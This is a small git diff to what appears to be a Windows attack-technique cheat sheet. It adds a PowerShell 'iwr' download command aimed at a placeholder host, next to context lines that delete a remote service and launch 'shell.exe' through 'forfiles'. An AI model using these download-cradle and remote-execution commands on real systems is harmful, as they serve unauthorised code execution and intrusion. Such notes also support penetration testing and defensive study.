@@ -350,6 +350,12 @@ sc \\host delete foobar                                         # 完事后删�
 forfiles /c shell.exe
 ```
 
+### iwr
+
+```
+iwr -useb http://xxx.com/test.txt
+```
+
 ---
 
 ## Other
